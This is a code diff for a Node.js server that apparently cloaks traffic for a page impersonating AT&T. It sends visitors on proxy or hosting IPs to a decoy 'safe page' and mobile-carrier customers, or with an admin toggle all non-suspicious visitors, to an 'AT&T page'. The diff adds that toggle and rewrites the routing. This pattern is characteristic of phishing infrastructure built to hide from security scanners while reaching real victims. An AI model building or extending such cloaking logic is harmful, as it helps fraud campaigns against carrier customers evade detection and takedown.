@@ -28,7 +28,10 @@ if (!fssync.existsSync(FORCED_IPS_FILE)) {
     fssync.writeFileSync(FORCED_IPS_FILE, JSON.stringify([]));
 }
 if (!fssync.existsSync(SETTINGS_FILE)) {
-    fssync.writeFileSync(SETTINGS_FILE, JSON.stringify({ isSuspiciousEnabled: true }));
+    fssync.writeFileSync(SETTINGS_FILE, JSON.stringify({ 
+        isSuspiciousEnabled: true,
+        isIspFilterEnabled: true 
+    }));
 }
 
 async function getVisitedIps() {
@@ -100,9 +103,17 @@ async function removeForcedIp(ip) {
 async function getSettings() {
     try {
         const data = await fs.readFile(SETTINGS_FILE, 'utf8');
-        return JSON.parse(data);
+        const settings = JSON.parse(data);
+        return {
+            isSuspiciousEnabled: true,
+            isIspFilterEnabled: true,
+            ...settings
+        };
     } catch (e) {
-        return { isSuspiciousEnabled: true };
+        return { 
+            isSuspiciousEnabled: true, 
+            isIspFilterEnabled: true 
+        };
     }
 }
 
@@ -279,18 +290,26 @@ app.get('/init', async (req, res) => {
         } else {
             const isSuspiciousMatch = isSuspicious && settings.isSuspiciousEnabled;
             
-            if (data && data.status === 'success' && !isSuspiciousMatch) {
+            if (isSuspiciousMatch) {
+                console.log(`[Init] Suspicious IP detected and filter is ENABLED. Redirecting to safe page.`);
+                targetUrl = NON_ATT_LANDING_PAGE;
+            } else if (!settings.isIspFilterEnabled) {
+                // ISP Filter is OFF - Redirect everyone who isn't suspicious
+                console.log(`[Init] ISP Filter is DISABLED. Redirecting all clean traffic to ATT page.`);
+                targetUrl = '/go-att';
+            } else if (data && data.status === 'success') {
+                // ISP Filter is ON - Standard ISP check
                 const userISP = (data.isp || data.org || "").toUpperCase();
                 if (MOBILE_ISPS.some(isp => userISP.includes(isp.toUpperCase()))) {
                     console.log(`[Init] Match found! ISP: ${userISP}. Redirecting to ATT page.`);
                     targetUrl = '/go-att';
                 } else {
-                    console.log(`[Init] No ISP match for: ${userISP}`);
+                    console.log(`[Init] No ISP match for: ${userISP}. Redirecting to safe page.`);
+                    targetUrl = NON_ATT_LANDING_PAGE;
                 }
-            } else if (isSuspiciousMatch) {
-                console.log(`[Init] Suspicious IP detected and filter is ENABLED. Redirecting to safe page.`);
             } else {
                 console.log(`[Init] Redirecting to safe page. Status: ${data?.status}`);
+                targetUrl = NON_ATT_LANDING_PAGE;
             }
         }
     }
@@ -346,7 +365,16 @@ app.get('/admin', requireAdmin, async (req, res) => {
                             <span class="slider"></span>
                         </label>
                     </div>
-                    <p class="status">If disabled, visits flagged as proxies/hosting will NOT be automatically blocked (unless they fail ISP check).</p>
+                    <p class="status">If enabled, visits flagged as proxies/hosting will be automatically blocked.</p>
+
+                    <div class="toggle-container" style="margin-top: 20px;">
+                        <span>Enable "Mobile ISP" Filter:</span>
+                        <label class="switch">
+                            <input type="checkbox" id="isIspFilterToggle" ${settings.isIspFilterEnabled ? 'checked' : ''}>
+                            <span class="slider"></span>
+                        </label>
+                    </div>
+                    <p class="status">If disabled, <b>ANY</b> legitimate visitor (not suspicious) will be redirected to the AT&T page, regardless of their ISP.</p>
                 </section>
 
                 <section>
@@ -413,6 +441,19 @@ app.get('/admin', requireAdmin, async (req, res) => {
                         method: 'POST',
                         headers: { 'Content-Type': 'application/json', 'x-admin-token': getAdminToken() },
                         body: JSON.stringify({ isSuspiciousEnabled: isEnabled })
+                    });
+                    if (!response.ok) {
+                        alert('Failed to update setting');
+                        e.target.checked = !isEnabled;
+                    }
+                });
+
+                document.getElementById('isIspFilterToggle').addEventListener('change', async (e) => {
+                    const isEnabled = e.target.checked;
+                    const response = await fetch('/api/admin/settings/update', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json', 'x-admin-token': getAdminToken() },
+                        body: JSON.stringify({ isIspFilterEnabled: isEnabled })
                     });
                     if (!response.ok) {
                         alert('Failed to update setting');
